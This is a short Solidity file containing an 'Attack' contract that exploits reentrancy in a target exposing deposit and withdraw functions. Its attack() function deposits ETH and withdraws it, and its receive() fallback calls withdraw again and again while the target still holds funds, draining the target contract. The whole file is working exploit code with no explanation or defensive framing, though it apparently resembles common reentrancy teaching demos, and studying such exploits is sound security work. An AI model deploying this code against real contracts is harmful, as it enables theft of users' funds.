// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attack {
    IVulnerable public target;
    uint256 private attackAmount;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}
